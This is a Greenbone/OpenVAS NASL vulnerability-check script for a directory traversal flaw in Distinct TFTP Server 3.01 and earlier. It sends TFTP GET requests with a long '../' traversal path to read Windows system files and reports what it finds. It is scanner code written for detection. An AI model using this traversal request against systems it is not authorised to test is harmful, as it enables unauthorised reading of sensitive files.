if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802623" );
	script_bugtraq_id( 52938 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-04-09 15:15:15 +0530 (Mon, 09 Apr 2012)" );
	script_name( "Distinct TFTP Server Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Remote file access" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "tftpd_backdoor.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/52938" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18718" );
	script_xref( name: "URL", value: "http://www.spentera.com/advisories/2012/SPN-01-2012.pdf" );
	script_tag( name: "impact", value: "Successful exploitation allows an attacker to obtain sensitive
  information and launch further attacks." );
	script_tag( name: "affected", value: "Distinct TFTP Server version 3.01 and prior." );
	script_tag( name: "insight", value: "The flaw is caused due an input validation error within the TFTP
  service and can be exploited to download or manipulate files in arbitrary locations outside the
  TFTP root via specially crafted directory traversal sequences." );
	script_tag( name: "solution", value: "Upgrade to Distinct TFTP Server version 3.11 or later." );
	script_tag( name: "summary", value: "This host is running Distinct TFTP Server and is prone to
  directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("tftp.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_has_reliable_get( port: port )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	res = tftp_get( path: "../../../../../../../../../../../../../../" + files[file], port: port );
	if(!res){
		continue;
	}
	if(egrep( pattern: file, string: res, icase: TRUE )){
		report = NASLString( "The " + files[file] + " file contains:\\n", res );
		security_message( port: port, data: report, proto: "udp" );
		exit( 0 );
	}
}
exit( 99 );

